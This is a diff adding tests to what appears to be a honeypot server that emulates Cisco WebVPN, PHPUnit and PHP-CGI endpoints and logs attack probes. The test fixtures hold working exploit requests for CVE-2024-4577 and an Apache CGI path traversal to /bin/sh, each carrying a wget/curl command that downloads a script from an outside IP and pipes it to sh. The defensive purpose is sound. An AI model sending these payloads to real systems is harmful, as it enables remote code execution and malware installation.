@@ -2,6 +2,7 @@
 from __future__ import annotations
 
 import base64
+import hashlib
 import json
 
 import pytest
@@ -1339,6 +1340,48 @@ async def test_dispatch_cisco_webvpn_logon_html(flux_client):
     assert entry["ciscoWebvpnPath"] == "/+CSCOE+/logon.html"
 
 
+async def test_dispatch_cisco_webvpn_logon_post_logs_username_not_password(flux_client):
+    resp = await flux_client.post(
+        "/+CSCOE+/logon.html",
+        data="Login=Login&buttonClicked=4&password=123&username=admin",
+        headers={
+            "X-Forwarded-For": "203.0.113.54",
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "cisco-webvpn-logon"
+    assert entry["ciscoWebvpnUsername"] == "admin"
+    assert entry["ciscoWebvpnHasPassword"] is True
+    assert "password" not in entry
+
+
+async def test_dispatch_anyconnect_config_auth_root_post(flux_client):
+    xml = b"""<?xml version="1.0" encoding="UTF-8"?>
+<config-auth client="vpn" type="init" aggregate-auth-version="2">
+  <version who="vpn">4.10.07073</version>
+  <device-id device-type="iPhone13,1">iOS</device-id>
+</config-auth>"""
+    resp = await flux_client.post(
+        "/",
+        data=xml,
+        headers={
+            "X-Forwarded-For": "203.0.113.55",
+            "Host": "vpn.example",
+            "Content-Type": "application/xml",
+        },
+    )
+    assert resp.status == 200
+    body = await resp.text()
+    assert "<config-auth" in body
+    assert "/+CSCOE+/logon.html" in body
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "cisco-anyconnect-config-auth"
+    assert entry["ciscoWebvpnPath"] == "/"
+    assert entry["ciscoAnyconnectVersion"] == "4.10.07073"
+
+
 async def test_dispatch_cisco_webvpn_jar(flux_client):
     resp = await flux_client.get("/+CSCOL+/Java.jar", headers={"X-Forwarded-For": "203.0.113.52"})
     assert resp.status == 200
@@ -2673,6 +2716,61 @@ async def test_cmd_injection_canary_failure_falls_back_to_static(flux_client, mo
     entry = _log_entries(flux_client.log_path)[-1]
     assert entry["canaryStatus"] == "issue-failed"
     assert entry["cmdFamily"] == "creds-aws"
+
+
+async def test_dispatch_phpunit_eval_get_body_returns_probe_hash(flux_client):
+    payload = b'<?php echo(md5("Hello PHPUnit"));'
+    resp = await flux_client.request(
+        "GET",
+        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        data=payload,
+        headers={"X-Forwarded-For": "203.0.113.90"},
+    )
+    assert resp.status == 200
+    body = await resp.text()
+    assert body == hashlib.md5(b"Hello PHPUnit").hexdigest() + "\n"
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "phpunit-eval-stdin"
+    assert entry["bodyBytesRead"] == len(payload)
+    assert entry["bodySha256"] == hashlib.sha256(payload).hexdigest()
+    assert entry["bodyPreview"].startswith("<?php echo")
+
+
+async def test_dispatch_php_cgi_rce_decodes_body_command(flux_client):
+    command = b"(wget -qO- https://46.151.182.82/sh || curl -sk https://46.151.182.82/sh) | sh"
+    encoded = base64.b64encode(command).decode("ascii")
+    payload = (
+        '<?php shell_exec(base64_decode("%s")); '
+        'echo(md5("Hello CVE-2024-4577")); ?>'
+    ) % encoded
+    resp = await flux_client.post(
+        "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+        data=payload,
+        headers={"X-Forwarded-For": "203.0.113.91"},
+    )
+    assert resp.status == 200
+    assert await resp.text() == hashlib.md5(b"Hello CVE-2024-4577").hexdigest() + "\n"
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "cmd-injection-php-cgi-rce"
+    assert entry["cmdSource"] == "body"
+    assert entry["cmdKey"] == "php://input"
+    assert "46.151.182.82" in entry["decodedCommand"]
+
+
+async def test_dispatch_apache_cgi_shell_body_logs_stdin_command(flux_client):
+    payload = b"(wget --no-check-certificate -qO- https://204.76.203.196/sh || curl -sk https://204.76.203.196/sh) | sh -s apache.selfrep"
+    resp = await flux_client.post(
+        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+        data=payload,
+        headers={"X-Forwarded-For": "203.0.113.92"},
+    )
+    assert resp.status == 200
+    assert await resp.read() == b""
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "cmd-injection-apache-cgi-shell"
+    assert entry["cmdSource"] == "body"
+    assert entry["cmdKey"] == "stdin"
+    assert "204.76.203.196" in entry["cmd"]
 
 
 # --- wp-config suffix-variant expansion ---
